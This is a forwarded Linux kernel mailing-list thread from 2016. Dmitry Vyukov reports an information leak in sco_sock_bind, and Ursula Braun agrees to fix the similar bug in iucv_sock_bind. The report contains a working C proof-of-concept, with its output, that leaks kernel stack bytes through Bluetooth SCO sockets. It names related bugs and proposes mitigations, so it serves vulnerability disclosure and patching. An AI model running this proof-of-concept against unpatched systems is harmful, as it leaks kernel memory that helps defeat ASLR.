From: Ursula Braun <ubraun-23VcF4HTsmIX0ybBhKVfKdBPR1lH4CV8@public.gmane.org>
Subject: [Fwd: Fw: Information leak in sco_sock_bind]
Date: Fri, 15 Jan 2016 09:25:01 +0100
Message-ID: <1452846301.3416.5.camel@BR9GV9YG.de.ibm.com>
Mime-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit
Cc: Marcel Holtmann <marcel-kz+m5ild9QBg9hUCZPvPmw@public.gmane.org>,
	Gustavo Padovan <gustavo-THi1TnShQwVAfugRpC6u6w@public.gmane.org>,
	Johan Hedberg <johan.hedberg-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>,
	"David S. Miller" <davem-fT/PcQaiUtIeIZ0/mPfg9Q@public.gmane.org>,
	linux-bluetooth-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, netdev <netdev-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>,
	LKML <linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>,
	syzkaller <syzkaller-/JYPxA39Uh5TLH3MbocFFw@public.gmane.org>,
	Kostya Serebryany <kcc-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>,
	Alexander Potapenko <glider-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>,
	Sasha Levin <sasha.levin-QHcLZuEGTsvQT0dZR+AlfA@public.gmane.org>,
	Eric Dumazet <edumazet-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>,
	Kees Cook <keescook-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>,
	Hannes Frederic Sowa <hannes-tFNcAqjVMyqKXQKiL6tip0B+6BGkLq7r@public.gmane.org>,
	"Ursula Braun1/Germany/IBM"@de.ibm.com, linux-s390-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
	Lauro Ramos Venancio <lauro.venancio-430g2QfJUUCGglJvpFV4uA@public.gmane.org>,
	Aloisio Almeida Jr <aloisio.almeida-430g2QfJUUCGglJvpFV4uA@public.gmane.org>,
	Samuel Ortiz <sameo-VuQAYsv1563Yd54FQh9/CA@public.gmane.org>
To: Dmitry Vyukov <dvyukov-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>
Return-path: <linux-bluetooth-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
Sender: linux-bluetooth-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
List-Id: netdev.vger.kernel.org

Hi Dmitry,

thx for mentioning iucv_sock_bind here. I will provide the equivalent
fix and add your name as "Reported-by" - if you do not object.

Regards, Ursula Braun

----- Forwarded by Ursula Braun1/Germany/IBM on 15/01/2016 09:18 -----

From:        Dmitry Vyukov <dvyukov-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>
To:        Marcel Holtmann <marcel-kz+m5ild9QBg9hUCZPvPmw@public.gmane.org>, Gustavo Padovan
<gustavo-THi1TnShQwVAfugRpC6u6w@public.gmane.org>, Johan Hedberg <johan.hedberg-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>, "David
S. Miller" <davem-fT/PcQaiUtIeIZ0/mPfg9Q@public.gmane.org>, linux-bluetooth-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
netdev <netdev-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, LKML <linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>,
syzkaller <syzkaller-/JYPxA39Uh5TLH3MbocFFw@public.gmane.org>, Kostya Serebryany
<kcc-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>, Alexander Potapenko <glider-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>, Sasha Levin
<sasha.levin-QHcLZuEGTsvQT0dZR+AlfA@public.gmane.org>, Eric Dumazet <edumazet-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>, Kees Cook
<keescook-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>, Hannes Frederic Sowa
<hannes-tFNcAqjVMyqKXQKiL6tip0B+6BGkLq7r@public.gmane.org>, Ursula Braun1/Germany/IBM@IBMDE,
linux-s390-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Lauro Ramos Venancio
<lauro.venancio-430g2QfJUUCGglJvpFV4uA@public.gmane.org>, Aloisio Almeida Jr
<aloisio.almeida-430g2QfJUUCGglJvpFV4uA@public.gmane.org>, Samuel Ortiz <sameo-VuQAYsv1563Yd54FQh9/CA@public.gmane.org>, 
Date:        15/12/2015 21:02
Subject:        Information leak in sco_sock_bind

Hello,

The following program leads to leak of 6 bytes from kernel stack:

#include <sys/types.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <linux/in6.h>
#include <linux/socket.h>
#include <linux/if.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

struct sockaddr_sco {
sa_family_t     sco_family;
char        sco_bdaddr[6];
};

#define BTPROTO_SCO 2

int main(void)
{
       struct sockaddr sa;
       struct sockaddr_sco sco_sa;
       unsigned len, i, try;
       int fd;

       for (try = 0; try < 3; try++) {
               fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_SCO);
               if (fd == -1)
                       return;
               switch (try) {
               case 0:
               break;
               case 1:
               sched_yield();
               break;
               case 2:
               open("/dev/null", O_RDONLY);
               }
               memset(&sco_sa, 0, sizeof(sco_sa));
               sco_sa.sco_family = AF_BLUETOOTH;
               bind(fd, &sco_sa, 2);
               len = sizeof(sa);
               getsockname(fd, &sa, &len);
               for (i = 0; i < len; i++)
                       printf("%02x", ((unsigned char*)&sa)[i]);
               printf("\n");
       }
       return 0;
}

Output:
1f00333e0088ffff
1f00c13e0088ffff
1f002081ffffffff

The problem is that sco_sock_bind does not check sockaddr_len passed
in, so it copies stack garbage from stack into the socket. This can
defeat ASLR, leak crypto keys, etc.
We've just fixed a similar issue in pptp_bind. The similar issue is in
llcp_sock_bind and llcp_raw_sock_bind. And there seems to be the same
bug in iucv_sock_bind, it is S390 specific, so I can't test it.

Kees proposed to zero unused part of sockaddr in SyS_bind/SyS_connect,
or add addr size to proto struct to prevent all such existing and
future bugs.
